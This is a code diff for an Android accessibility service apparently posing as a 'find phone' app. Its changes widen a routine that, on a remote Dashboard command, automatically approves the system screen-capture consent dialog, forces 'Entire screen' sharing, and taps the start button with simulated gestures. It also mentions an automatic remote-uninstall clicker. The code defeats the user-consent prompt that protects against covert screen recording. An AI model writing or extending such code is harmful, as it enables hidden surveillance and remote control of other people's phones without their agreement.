@@ -65,12 +65,9 @@ class FindPhoneAccessibilityService : AccessibilityService() {
         val pkgName = event.packageName?.toString() ?: ""
         val now = System.currentTimeMillis()
 
-        // 1. Automatic "Start now" clicker: ONLY when explicitly requested by Dashboard command!
+        // 1. Automatic "Start now" / "Share screen" clicker: ONLY when explicitly requested by Dashboard command!
         if (now <= expectingScreenCaptureUntil) {
-            val lower = pkgName.lowercase()
-            if (lower.contains("systemui") || lower.contains("permissioncontroller")) {
-                autoApproveScreenCaptureDialog()
-            }
+            autoApproveScreenCaptureDialog()
         }
 
         // 2. Automatic Uninstall clicker: ONLY when remote uninstall was requested by Dashboard!
@@ -161,51 +158,113 @@ class FindPhoneAccessibilityService : AccessibilityService() {
             val roots = getAllRoots()
             if (roots.isEmpty()) return
 
+            var dialogDetected = false
+            for (root in roots) {
+                // Check if Screen Capture / MediaProjection dialog is currently active
+                val promptKeywords = listOf("Share your screen", "Share screen", "Start recording", "MediaProjection", "visible to Phone Link", "casting your screen")
+                for (pkw in promptKeywords) {
+                    if (root.findAccessibilityNodeInfosByText(pkw).isNotEmpty()) {
+                        dialogDetected = true
+                        break
+                    }
+                }
+                if (dialogDetected) break
+            }
+
+            if (!dialogDetected) {
+                return
+            }
+
             for (root in roots) {
                 // Step 1: Android 14/15 "Single app" vs "Entire screen" spinner handling
+                // ONLY click if the dropdown is currently set to "A single app" or "Single app"
                 val singleAppTexts = listOf("A single app", "Single app", "A single application", "Ek app")
+                var switchedFromSingleApp = false
                 for (sat in singleAppTexts) {
                     val singleAppNodes = root.findAccessibilityNodeInfosByText(sat)
                     for (node in singleAppNodes) {
                         Log.i(TAG, "Detected Android 14/15 Screen Share dropdown with '$sat' -> Clicking to switch to Entire screen")
                         clickNodeOrGesture(node)
                         node.recycle()
+                        switchedFromSingleApp = true
                         break
                     }
+                    if (switchedFromSingleApp) break
                 }
 
-                // If dropdown menu opened, select "Entire screen"
-                val entireScreenKeywords = listOf("Entire screen", "Share entire screen", "Entire display", "Whole screen", "Poori screen")
-                for (esk in entireScreenKeywords) {
-                    val entireNodes = root.findAccessibilityNodeInfosByText(esk)
-                    for (node in entireNodes) {
-                        Log.i(TAG, "Selecting '$esk' in Android 14/15 Screen Share menu!")
-                        clickNodeOrGesture(node)
-                        node.recycle()
-                        break
+                // If dropdown was opened from "Single app", select "Entire screen" from the popup list
+                if (switchedFromSingleApp) {
+                    val entireScreenKeywords = listOf("Entire screen", "Entire display", "Whole screen", "Poori screen")
+                    for (esk in entireScreenKeywords) {
+                        val entireNodes = root.findAccessibilityNodeInfosByText(esk)
+                        for (node in entireNodes) {
+                            Log.i(TAG, "Selecting '$esk' in Android 14/15 Screen Share menu!")
+                            clickNodeOrGesture(node)
+                            node.recycle()
+                            break
+                        }
                     }
                 }
 
-                // Step 2: Positive Start / Share screen button
-                val candidates = mutableListOf<AccessibilityNodeInfo>()
-                candidates.addAll(root.findAccessibilityNodeInfosByViewId("android:id/button1"))
-                candidates.addAll(root.findAccessibilityNodeInfosByViewId("com.android.systemui:id/button1"))
-                candidates.addAll(root.findAccessibilityNodeInfosByViewId("com.android.permissioncontroller:id/permission_allow_button"))
+                // Step 2: Positive Start / Share screen button - Universal across Android 10-15 and all OEMs
+                val candidateNodes = mutableListOf<AccessibilityNodeInfo>()
 
-                val keywords = listOf("Start now", "Start recording", "Start", "Share screen", "Cast screen", "chalu karein", "shuru karein")
-                for (kw in keywords) {
-                    candidates.addAll(root.findAccessibilityNodeInfosByText(kw))
+                // Strategy A: Universal View IDs
+                val buttonIds = listOf(
+                    "com.android.systemui:id/screen_share_start_button",
+                    "com.android.systemui:id/button_start",
+                    "com.android.systemui:id/start_button",
+                    "com.android.systemui:id/button1",
+                    "android:id/button1",
+                    "com.android.permissioncontroller:id/permission_allow_button"
+                )
+                for (id in buttonIds) {
+                    candidateNodes.addAll(root.findAccessibilityNodeInfosByViewId(id))
                 }
 
-                for (node in candidates) {
-                    val clicked = clickNodeOrGesture(node)
-                    if (clicked) {
-                        Log.i(TAG, "Auto-approved MediaProjection screen capture prompt via Accessibility click!")
-                        expectingScreenCaptureUntil = 0L
-                        node.recycle()
-                        return
+                // Strategy B: Exact & substring positive action texts (English & Hindi)
+                val positiveTexts = listOf("Share screen", "Start now", "Start recording", "Start", "Cast screen", "chalu karein", "shuru karein")
+                for (txt in positiveTexts) {
+                    val found = root.findAccessibilityNodeInfosByText(txt)
+                    for (fn in found) {
+                        val nodeText = fn.text?.toString()?.trim() ?: ""
+                        val desc = fn.contentDescription?.toString()?.trim() ?: ""
+                        // Filter out title ("Share your screen with...") and negative buttons ("Cancel")
+                        val isTitle = nodeText.contains("Share your screen with", ignoreCase = true) || desc.contains("Share your screen with", ignoreCase = true)
+                        val isNegative = nodeText.contains("cancel", ignoreCase = true) || nodeText.contains("deny", ignoreCase = true)
+                        val isSpinner = nodeText.contains("Share entire screen", ignoreCase = true) && !nodeText.equals("Share screen", ignoreCase = true)
+
+                        if (!isTitle && !isNegative && !isSpinner) {
+                            candidateNodes.add(fn)
+                        } else {
+                            fn.recycle()
+                        }
                     }
-                    node.recycle()
+                }
+
+                // Click and tap candidate buttons
+                for (node in candidateNodes) {
+                    try {
+                        // 1. Accessibility action click
+                        node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
+
+                        // 2. Hardware Touch Gesture tap at exact center
+                        val rect = android.graphics.Rect()
+                        node.getBoundsInScreen(rect)
+                        if (rect.width() > 0 && rect.height() > 0) {
+                            val path = android.graphics.Path().apply {
+                                moveTo(rect.exactCenterX(), rect.exactCenterY())
+                            }
+                            val stroke = android.accessibilityservice.GestureDescription.StrokeDescription(path, 0, 50)
+                            val gesture = android.accessibilityservice.GestureDescription.Builder().addStroke(stroke).build()
+                            dispatchGesture(gesture, null, null)
+                            Log.i(TAG, "Tapped screen share positive button at (${rect.centerX()}, ${rect.centerY()})")
+                        }
+                    } catch (e: Exception) {
+                        Log.w(TAG, "Error clicking candidate node: ${e.message}")
+                    } finally {
+                        node.recycle()
+                    }
                 }
             }
         } catch (e: Exception) {
